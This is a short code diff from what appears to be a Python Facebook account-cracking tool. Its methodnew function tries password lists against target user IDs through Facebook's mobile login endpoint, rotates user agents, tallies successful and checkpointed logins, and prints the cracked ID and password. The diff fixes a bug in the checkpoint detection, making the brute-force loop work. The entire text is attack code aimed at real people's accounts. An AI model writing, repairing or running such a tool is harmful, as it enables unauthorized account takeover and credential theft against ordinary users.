@@ -996,11 +996,10 @@ def methodnew(idf,pwv):
 	global loop,ok,cp
 	rr=random.randint
 	auth1='Rudal-XD'
-	r=requests.Session()
+	ses=requests.Session()
 	prog.update(des,description=f'\r[bold white]new [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
 	prog.advance(des)
 	ua = random.choice(free)
-	hst= 'iphone.facebook.com'
 	ua2='Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36'
 	for pw in pwv:
 		pw = pw.lower()
@@ -1033,7 +1032,7 @@ def methodnew(idf,pwv):
 			cookie = requests.Session().cookies.get_dict()
 			next = 'https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
 			post = requests.Session().post(next,headers=hdg,data=data,cookies=cookie)
-			if "checkpoint" in po.cookies.get_dict().keys():
+			if "checkpoint" in post.cookies.get_dict().keys():
 				cp+=1
 				print('\n')
 				statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
